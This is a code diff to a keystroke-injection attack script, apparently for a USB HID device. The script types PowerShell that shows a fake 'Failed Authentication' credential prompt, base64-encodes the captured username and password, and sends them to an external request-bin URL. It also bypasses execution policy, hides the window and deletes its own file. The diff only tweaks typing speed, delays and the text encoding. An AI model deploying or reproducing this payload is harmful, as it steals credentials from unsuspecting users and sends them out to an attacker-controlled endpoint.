@@ -6,14 +6,17 @@
 // You can use this public bin for testing: https://requestbin.com/r/enemdzl11o27
 
 var URL = "http://enemdzl11o27.x.pipedream.net"
-
+typingSpeed(0,0);
 layout('us')			
 press("GUI r")
 delay(500);
 type("powershell\n")
-delay(500)
-type("$popup = \"while (`$true){`$cred = `$host.ui.promptforcredential(`'Failed Authentication`',`'`',[Environment]::UserDomainName + `\"\\`\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};if (`$cred.getnetworkcredential().password) {break :DoLoop}};`$Text = `$cred.username + `\":`\" + `$cred.getnetworkcredential().password;`$Bytes = [System.Text.Encoding]::Unicode.GetBytes(`$Text);`$EncodedText =[Convert]::ToBase64String(`$Bytes);Invoke-WebRequest -UseBasicParsing -Uri " + URL + "/`$EncodedText; rm $Env:UserProfile\\popup.ps1\"\n")
+delay(1500)
+typingSpeed(0,0);
+type("$popup = \"while (`$true){`$cred = `$host.ui.promptforcredential(`'Failed Authentication`',`'`',[Environment]::UserDomainName + `\"\\`\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};if (`$cred.getnetworkcredential().password) {break :DoLoop}};`$Text = `$cred.username + `\":`\" + `$cred.getnetworkcredential().password;`$Bytes = [System.Text.Encoding]::UTF8.GetBytes(`$Text);`$EncodedText =[Convert]::ToBase64String(`$Bytes);Invoke-WebRequest -UseBasicParsing -Uri " + URL + "/`$EncodedText; rm $Env:UserProfile\\popup.ps1\"\n")
 delay(500)
 type("echo $popup > $Env:UserProfile\\popup.ps1\n")
 delay(1000)
 type("powershell.exe -Exec Bypass -windowstyle hidden $Env:UserProfile\\popup.ps1\n")
+
+
